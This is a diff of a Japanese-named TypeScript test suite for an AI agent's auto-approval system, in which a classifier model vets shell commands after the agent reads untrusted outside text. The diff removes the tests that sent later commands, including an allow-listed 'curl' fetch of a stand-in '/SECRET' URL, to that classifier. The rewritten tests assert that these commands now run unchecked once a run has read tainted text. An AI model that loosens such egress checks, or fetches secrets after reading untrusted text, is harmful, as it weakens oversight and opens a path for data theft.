@@ -98,42 +98,6 @@ test('自動承認（エンジン）: 判定役はその実行が使っている
   assert.ok(isClassifier(s.adapter().calls[1]!));
 });
 
-// 4-3b-2: normal を消すときに消す
-test('自動承認（エンジン）: ふつうのモードでも判定役が決める。allow なら札なしで動く', async t => {
-  const s = await startApp(t);
-  const outside = outsideRead(s);
-  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('読みました')];
-  const sent = await post(s, REQUEST);
-  await settled(s.app, sent.body.runId);
-  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
-  assert.equal(s.app.pending.list({ status: 'waiting' }).length, 0);
-  assert.equal(autoRows(s).length, 1);
-  assert.equal(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run'").get()!.decided_by, 'auto-mode');
-});
-
-// 4-3b-2: normal を消すときに消す
-test('自動承認（エンジン）: 実行の途中でモードを替えても、替える前も後も判定役が決める', async t => {
-  const s = await startApp(t);
-  const outside = outsideRead(s);
-  const g = gate();
-  s.adapter().scripts = [after(g, toolCall('shell_run', { command: outside.command })), say(ALLOW), say('読みました')];
-  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
-  assert.equal((await s.json(`/api/conversations/${CONVERSATION}`, 'PATCH', { permissionMode: 'normal' })).status, 200);
-  g.open();
-  await settled(s.app, sent.body.runId);
-  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, 'auto からふつうに替えても判定役');
-
-  const t2 = await startApp(t);
-  const outside2 = outsideRead(t2);
-  const g2 = gate();
-  t2.adapter().scripts = [after(g2, toolCall('shell_run', { command: outside2.command })), say(ALLOW), say('読みました')];
-  const second = await post(t2, REQUEST);
-  await t2.json(`/api/conversations/${CONVERSATION}`, 'PATCH', { permissionMode: 'auto' });
-  g2.open();
-  await settled(t2.app, second.body.runId);
-  assert.equal(t2.adapter().calls.filter(isClassifier).length, 1, 'ふつうから auto に替えても判定役');
-});
-
 test('自動承認（エンジン）: 判定役のモデルの呼び出しが失敗したら、judge_failed で Pending に積まれる。持ち主が許せば動く', async t => {
   const s = await startApp(t);
   const outside = outsideRead(s);
@@ -169,7 +133,6 @@ test('自動承認（エンジン）: 製品の外でコードを動かす今回
   assert.equal(t2.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
   assert.ok(classifierText(t2).includes(TAINTED_NOTE), '判定役に、よそから来た文を読んだ会話だと伝える');
   assert.equal(autoRows(t2).length, 1);
-  assert.match((JSON.parse(autoRows(t2)[0]!.reasons) as string[]).join('\n'), /text that came from somewhere else/u, '理由に taint が載る');
 });
 
 // ── 外から読んだ内容のあと（Web）。同じ実行の中でも、止めたあとの次の実行にも持ち越す ──
@@ -198,7 +161,7 @@ async function webApp(t: { after: (fn: () => void) => void }) {
   return { app, adapter: () => adapter, command, paths };
 }
 
-test('4-3a 本番の守り: 既定の設定で作った App では、確かめの要る呼び出しは normal の会話でも判定役に回り、Pending に積まれ、札の出来事は出ない', async t => {
+test('4-3a 本番の守り: 既定の設定で作った App では、確かめの要る呼び出しは会話でも判定役に回り、Pending に積まれ、札の出来事は出ない', async t => {
   const s = await webApp(t);
   const seen: RunEvent[] = [];
   s.app.bus.subscribe(e => { seen.push(e.event); });
@@ -221,7 +184,7 @@ test('自動承認（エンジン）: Web を読んだあとの外読みは、�
   assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
   const rows = s.app.db.prepare("SELECT reasons FROM approvals WHERE scope = 'auto'").all() as Array<{ reasons: string }>;
   assert.equal(rows.length, 1);
-  assert.match((JSON.parse(rows[0]!.reasons) as string[]).join('\n'), /text that came from somewhere else/u, '理由に taint が載る');
+  assert.ok(classifierText(s).includes(TAINTED_NOTE), '判定役に、よそから来た文を読んだ会話だと伝える');
   assert.equal(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run'").get()!.decided_by, 'auto-mode');
 });
 
@@ -266,20 +229,18 @@ test('自動承認（エンジン）: Web を読んだ実行が止められた�
   await settled(s.app, second.runId);
   assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
   assert.ok(classifierText(s).includes(TAINTED_NOTE), '持ち越した印は、判定役に伝わる');
-  assert.match((JSON.parse(autoRows(s)[0]!.reasons) as string[]).join('\n'), /text that came from somewhere else/u, '理由に taint が載る（持ち越した印）');
 });
 
-// 4-3b-2: afterAutoRead を消すと順 2
-test('自動承認（エンジン）: 外のメモを自動で読んだあとの、許可の一覧にある取得（curl）は、同じ返事の中でも判定役に回る（egress）', async t => {
+test('自動承認（エンジン）: 外のメモを自動で読んだあとの、許可の一覧にある取得（curl）は、同じ返事の中では確かめなしに動く', async t => {
   const s = await startApp(t);
   const outside = outsideRead(s);
   const fetch = process.platform === 'win32' ? 'curl.exe -s https://beat-test.invalid/SECRET' : 'curl -s https://beat-test.invalid/SECRET';
-  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), toolCall('shell_run', { command: fetch }), say(ASK), say('おわり')];
+  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), toolCall('shell_run', { command: fetch }), say('おわり')];
   const sent = await post(s, REQUEST, { permissionMode: 'auto' });
   await settled(s.app, sent.body.runId);
-  assert.equal(s.adapter().calls.filter(isClassifier).length, 2, '取得も判定役が見る');
-  assert.match(judgeShown(s, 1), /outside the allowed folders in this conversation/u, '判定役に、外を読んだ会話の毎回の確かめと伝わる');
-  assert.deepEqual(s.app.pending.list({ status: 'waiting' }).map(r => r.kind), ['judge']);
+  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が見たのは外読みだけ');
+  assert.equal(s.app.pending.list({ status: 'waiting' }).length, 0);
+  assert.deepEqual(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run' ORDER BY created_at").all().map(r => r.decided_by), ['auto-mode', 'builtin']);
   assert.equal(autoRows(s).length, 1, '自動で許したのは最初の外読みだけ');
 });
 
@@ -293,10 +254,10 @@ test('自動承認（エンジン）: シェルで外から取得したら、実
   assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
   assert.equal(s.app.runs.get(sent.body.runId)!.tainted, 1, '実行の記録に印が残る（止めた・落ちた実行の次の実行へ引き継ぐ材料）');
   assert.equal(autoRows(s).length, 1);
-  assert.deepEqual([...(JSON.parse(autoRows(s)[0]!.reasons) as string[])].filter(r => /text that came from somewhere else/u.test(r)).length, 1, '理由に taint が載る');
+  assert.ok(classifierText(s).includes(TAINTED_NOTE), '判定役に、よそから来た文を読んだ会話だと伝える');
 });
 
-// ── 会話の印（一度でも外から読んだ会話は、判定役を使わない）と、自動承認で外を読んだ印の持ち越し ──
+// ── 会話の印（一度でも外から読んだ会話）と、自動承認で外を読んだあとの実行 ──
 
 test('自動承認（エンジン）: 一度でもよそから来た文を読んだ実行のある会話は、最後まで返事を書いて「読んだ」扱いが切れたあとの別の実行でも、判定役に「よそから来た文を読んだ会話」と伝える。外読みは判定役が決める', async t => {
   const s = await webApp(t);
@@ -342,12 +303,10 @@ test('自動承認（エンジン）: 外から読んだことの無い会話に
   assert.equal(attached.app.conversations.everTainted(CONVERSATION), true);
 });
 
-// 4-3b-2: afterAutoRead を消すと順 2
-test('自動承認（エンジン）: 自動で外を読んだ実行を止めた・失敗したあとの次の実行も、シェルのコマンドは判定役に回る（会話の印が残る）', async t => {
+test('自動承認（エンジン）: 自動で外を読んだ実行を止めた・失敗したあとの次の実行のシェルのコマンドは、確かめなしに動く（会話に印を残さない）', async t => {
   const untilStopped: Script = async function* (req) {
     await new Promise((_, reject) => req.signal.addEventListener('abort', () => reject(req.signal.reason), { once: true }));
   };
-  // 止めた実行
   const stopped = await startApp(t);
   const outside = outsideRead(stopped);
   stopped.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), untilStopped];
@@ -356,15 +315,12 @@ test('自動承認（エンジン）: 自動で外を読んだ実行を止めた
   stopped.app.engine.stop(first.body.runId);
   await settled(stopped.app, first.body.runId);
   await stopped.app.engine.wait(first.body.runId);
-  assert.equal(stopped.app.conversations.everAutoRead(CONVERSATION), true, '会話の印が付く');
-  stopped.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ASK), say('おわり')];
-  const second = await post(stopped, '続けて、もう一度読んで', { permissionMode: 'auto' });
+  stopped.adapter().scripts = [toolCall('shell_run', { command: 'echo hello' }), say('おわり')];
+  const second = await post(stopped, '続けて', { permissionMode: 'auto' });
   await settled(stopped.app, second.body.runId);
-  assert.equal(stopped.adapter().calls.filter(isClassifier).length, 2, '持ち越した印のあとも判定役が見る');
-  assert.match(judgeShown(stopped, 1), /outside the allowed folders in this conversation/u);
-  assert.deepEqual(stopped.app.pending.list({ status: 'waiting' }).map(r => r.kind), ['judge']);
+  assert.equal(stopped.adapter().calls.filter(isClassifier).length, 1, '次の実行のコマンドは判定役に回らない');
+  assert.equal(stopped.app.pending.list({ status: 'waiting' }).length, 0);
 
-  // 失敗した実行（使えるモデルが 1 つで、読んだあとの呼び出しが失敗する）
   const failing = await startApp(t, { models: [fakeModel('only')] });
   const outside2 = outsideRead(failing);
   failing.adapter().scripts = [toolCall('shell_run', { command: outside2.command }), say(ALLOW), fail(new Error('接続できません'))];
@@ -372,13 +328,11 @@ test('自動承認（エンジン）: 自動で外を読んだ実行を止めた
   await settled(failing.app, third.body.runId);
   await failing.app.engine.wait(third.body.runId);
   assert.equal(failing.app.runs.get(third.body.runId)!.ok, 0);
-  assert.equal(failing.app.conversations.everAutoRead(CONVERSATION), true);
-  failing.adapter().scripts = [toolCall('shell_run', { command: outside2.command }), say(ASK), say('おわり')];
+  failing.adapter().scripts = [toolCall('shell_run', { command: 'echo hello' }), say('おわり')];
   const fourth = await post(failing, '続けて', { permissionMode: 'auto' });
   await settled(failing.app, fourth.body.runId);
-  assert.equal(failing.adapter().calls.filter(isClassifier).length, 2, '失敗した実行のあとも判定役が見る');
-  assert.match(judgeShown(failing, 1), /outside the allowed folders in this conversation/u);
-  assert.deepEqual(failing.app.pending.list({ status: 'waiting' }).map(r => r.kind), ['judge']);
+  assert.equal(failing.adapter().calls.filter(isClassifier).length, 1, '失敗した実行のあとも判定役に回らない');
+  assert.equal(failing.app.pending.list({ status: 'waiting' }).length, 0);
 });
 
 test('自動承認（エンジン）: Pending で持ち主が許した git clone も、動かしたら「外から読んだ」印が付く。そのあとの外読みは判定役に「よそから来た文を読んだ会話」と伝わる', async t => {
@@ -403,8 +357,7 @@ test('自動承認（エンジン）: Pending で持ち主が許した git clone
   assert.equal(autoRows(s).length, 1);
 });
 
-// 4-3b-2: afterAutoRead を消すと順 2
-test('自動承認（エンジン）: 外のメモを自動で読んだ会話は、その返事が終わったあとの発言でも、シェルのコマンド（許可の一覧にある curl も）を判定役に回す（egress）。モードをふつうに戻しても、ずっと', async t => {
+test('自動承認（エンジン）: 外のメモを自動で読んだ会話でも、その返事が終わったあとの発言のシェルのコマンド（許可の一覧にある curl も）は確かめなしに動く', async t => {
   const s = await startApp(t);
   const outside = outsideRead(s);
   const fetch = process.platform === 'win32' ? 'curl.exe -s https://x.invalid/SECRET' : 'curl -s https://x.invalid/SECRET';
@@ -413,25 +366,18 @@ test('自動承認（エンジン）: 外のメモを自動で読んだ会話は
   await settled(s.app, first.body.runId);
   await s.app.engine.wait(first.body.runId);
   assert.equal(s.app.runs.get(first.body.runId)!.ok, 1, '最後まで返事を書いて終わった');
-  assert.equal(s.app.conversations.everAutoRead(CONVERSATION), true);
   assert.equal(autoRows(s).length, 1);
 
-  // 次の発言（別の実行）: 許可の一覧にある取得も、判定役が見る
-  s.adapter().scripts = [toolCall('shell_run', { command: fetch }), say(ASK), say('おわり')];
-  const second = await post(s, '続けて、これを取ってきて', { permissionMode: 'auto' });
+  s.adapter().scripts = [toolCall('shell_run', { command: fetch }), say('おわり')];
+  const second = await post(s, '続けて、これを取ってきて');
   await settled(s.app, second.body.runId);
   await s.app.engine.wait(second.body.runId);
-  assert.equal(s.adapter().calls.filter(isClassifier).length, 2, '取得も判定役が見る');
-  assert.match(judgeShown(s, 1), /outside the allowed folders in this conversation/u, '判定役に、外を読んだ会話の毎回の確かめと伝わる');
-
-  // ふつうのモードに戻しても、ふつうのコマンドも判定役が見る
-  s.adapter().scripts = [toolCall('shell_run', { command: 'echo hello' }), say(ASK), say('おわり')];
-  const third = await post(s, 'ふつうのモードで', { permissionMode: 'normal' });
+  s.adapter().scripts = [toolCall('shell_run', { command: 'echo hello' }), say('おわり')];
+  const third = await post(s, 'もう一つ');
   await settled(s.app, third.body.runId);
-  assert.equal(s.adapter().calls.filter(isClassifier).length, 3, 'echo も判定役が見る');
-  assert.match(judgeShown(s, 2), /outside the allowed folders in this conversation/u);
-  assert.deepEqual(s.app.pending.list({ status: 'waiting' }).map(r => r.kind), ['judge', 'judge']);
-  assert.equal(autoRows(s).length, 1);
+  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が見たのは最初の外読みだけ');
+  assert.equal(s.app.pending.list({ status: 'waiting' }).length, 0);
+  assert.deepEqual(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run' ORDER BY created_at").all().map(r => r.decided_by), ['auto-mode', 'builtin', 'builtin']);
 });
 
 // ── タスクの実行（持ち主の判断 2026-11-12: タスクは自動承認で動く） ──
@@ -453,26 +399,25 @@ function workspaceRead(s: Awaited<ReturnType<typeof webApp>>): string {
   return process.platform === 'win32' ? `Get-Content "${path}" | ConvertFrom-Json` : `cat "${path}"`;
 }
 
-test('自動承認（タスク）: Web を読んだあとのシェルの読み取りは、判定役が allow なら持ち主に聞かずに動く。記録は chat と同じく auto-mode', async t => {
+test('自動承認（タスク）: Web を読んだあとの、許可フォルダの中のシェルの読み取りは、判定役を呼ばずに動く（R19）。外読みは判定役が allow なら持ち主に聞かずに動き、記録は chat と同じく auto-mode', async t => {
   const s = await webApp(t);
   const command = workspaceRead(s);
-  const started = await runTaskWith(s, [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command }), say(ALLOW), say('おわり')]);
+  const started = await runTaskWith(s, [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command }), toolCall('shell_run', { command: s.command }), say(ALLOW), say('おわり')]);
   await started.done;
   assert.equal(s.app.pending.list({ status: 'waiting' }).length, 0, 'Pending に積まれない');
-  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
+  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めたのは外読みだけ');
   assert.ok(classifierText(s).includes('天気を調べる'), '判定役が見る依頼は、持ち主が書いたタスクの題');
   assert.ok(!classifierText(s).includes(TASK_PROMPT), 'ワーカーが組み立てた文は見せない');
   assert.ok(classifierText(s).includes(TAINTED_NOTE));
-  const shell = s.app.db.prepare("SELECT decision, decided_by, ok FROM tool_calls WHERE tool = 'shell_run'").get() as { decision: string; decided_by: string; ok: number };
-  assert.deepEqual([shell.decision, shell.decided_by, shell.ok], ['allow', 'auto-mode', 1]);
-  const rows = s.app.db.prepare("SELECT run_id, status, reasons FROM approvals WHERE scope = 'auto'").all() as Array<{ run_id: string; status: string; reasons: string }>;
+  const shells = s.app.db.prepare("SELECT decision, decided_by, ok FROM tool_calls WHERE tool = 'shell_run' ORDER BY created_at").all() as Array<{ decision: string; decided_by: string; ok: number }>;
+  assert.deepEqual(shells.map(r => [r.decision, r.decided_by, r.ok]), [['allow', 'builtin', 1], ['allow', 'auto-mode', 1]]);
+  const rows = s.app.db.prepare("SELECT run_id, status FROM approvals WHERE scope = 'auto'").all() as Array<{ run_id: string; status: string }>;
   assert.deepEqual(rows.map(r => [r.run_id, r.status]), [[started.runId, 'approved']]);
-  assert.match((JSON.parse(rows[0]!.reasons) as string[]).join('\n'), /text that came from somewhere else/u);
 });
 
 test('自動承認（タスク）: 判定役が答えられない（モデルを呼べない）ときは、chat と同じく judge_failed で Pending に積まれる', async t => {
   const s = await webApp(t);
-  const command = workspaceRead(s);
+  const command = s.command;
   const started = await runTaskWith(s, [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command }), fail(new Error('接続できません')), say('おわり')]);
   const { rows } = await parked(s, started, '判定役が答えられない');
   assert.deepEqual(rows.map(r => [r.tool, r.kind, r.tainted]), [['shell_run', 'judge_failed', true]]);
@@ -537,7 +482,7 @@ test('自動承認（タスク）: よそから来た文を読んだあとの、
 
 test('自動承認（タスク）: 判定役に見せる依頼は、持ち主の書いた題・詳細・終わりの条件だけ。次の一手・経過・ワーカーの文は見せない', async t => {
   const s = await webApp(t);
-  const command = workspaceRead(s);
+  const command = s.command;
   const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => {
     const task = s.app.tasks.create({ title: 'TITLE-MARKER', body: 'BODY-MARKER', doneCriteria: 'DONE-MARKER', nextAction: 'NEXT-ACTION-MARKER', origin: 'user', actor: 'user' });
     s.app.tasks.event(task.id, 'reason', 'beat', 'HISTORY-MARKER');
@@ -556,7 +501,7 @@ test('自動承認（タスク）: beat が自分で決めたタスク・好奇�
     ['self の予定', (s: Awaited<ReturnType<typeof webApp>>) => s.app.tasks.spawnNow(s.app.tasks.create({ title: '自分で決めた予定', origin: 'self', actor: 'beat', cron: '0 9 * * *' }).id)!],
   ] as const) {
     const s = await webApp(t);
-    const command = workspaceRead(s);
+    const command = s.command;
     const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => make(s));
     assert.equal(await noRequest(s, started, label), 0, `${label}: 判定役を呼ばない`);
   }
@@ -592,7 +537,7 @@ test('自動承認（タスク）: よそから来た文を読んだ実行（そ
     ['記録の無い実行', 'missing', 'note'], ['作った（読んでいない実行）', false, 'context'], ['書き換えた（読んでいない実行）', false, 'edited'],
   ] as const) {
     const s = await webApp(t);
-    const command = workspaceRead(s);
+    const command = s.command;
     const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => {
       const chat = s.app.conversations.create({ title: '作った会話' });
       const runId = `run-${label}`;
@@ -612,7 +557,7 @@ test('自動承認（タスク）: よそから来た文を読んだ実行（そ
 
 test('自動承認（タスク）: 実行の記録が無い印（untrusted-input）がタスクの経過にあれば、判定役に見せる依頼は空になり、judge_failed（no_request）で持ち主に聞く', async t => {
   const s = await webApp(t);
-  const command = workspaceRead(s);
+  const command = s.command;
   let taskId = '';
   const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => {
     const task = s.app.tasks.create({ title: '印の付いたタスク', origin: 'user', actor: 'user' });
@@ -629,7 +574,7 @@ test('自動承認（タスク）: 実行の記録が無い印（untrusted-input
 
 test('自動承認（タスク）: よそから来た文を読んだ会話（ever_tainted）の実行が作ったタスクも、judge_failed（no_request）で持ち主に聞く', async t => {
   const s = await webApp(t);
-  const command = workspaceRead(s);
+  const command = s.command;
   const started = await runTaskWith(s, [WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')], () => {
     const chat = s.app.conversations.create({ title: '読んだ会話' });
     s.app.conversations.markTainted(chat.id);
@@ -643,7 +588,7 @@ test('自動承認（タスク）: よそから来た文を読んだ会話（eve
 
 test('自動承認（タスク）: 道具を何十回も使った長い実行でも、判定役は持ち主の依頼を見られる（会話の最後の 50 件に依頼が無くても）', async t => {
   const s = await webApp(t);
-  const command = workspaceRead(s);
+  const command = s.command;
   const many = Array.from({ length: 30 }, (_, i) => toolCall('calculate', { expression: `${i}+1` }));
   const started = await runTaskWith(s, [...many, WEB(), toolCall('shell_run', { command }), say(ALLOW), say('おわり')]);
   await started.done;
